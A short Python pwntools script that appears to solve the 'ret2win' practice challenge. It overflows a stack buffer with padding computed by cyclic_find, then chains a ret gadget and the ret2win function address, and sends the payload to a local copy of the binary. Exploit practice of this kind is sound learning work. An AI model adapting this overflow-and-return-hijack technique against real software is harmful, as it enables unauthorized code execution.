from pwn import *
import os

os.environ["SHELL"] = "/bin/sh"

context.binary = elf = ELF('./ret2win')
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['st', '--', '/bin/sh', '-c']



offset = cyclic_find(0x6161616c6161616b)

r_ret = 0x40053e

#print(hex(elf.symbols["ret2win"]))

payload = (b'a' * offset) + p64(r_ret)  + p64(elf.symbols["ret2win"])

gdb_script = '''
break *0x400749
continue
'''


#io = gdb.debug(elf.path, gdbscript=gdb_script)

io = elf.process()

#pause()

print("[+] We hit the break point after read()!")

print(io.recv().decode())

io.sendline(payload)

print("[+] We hit the break point after read()!")

print(io.recv().decode())
print(io.recv().decode())

print("[+] The binary has finished running")
#pause()
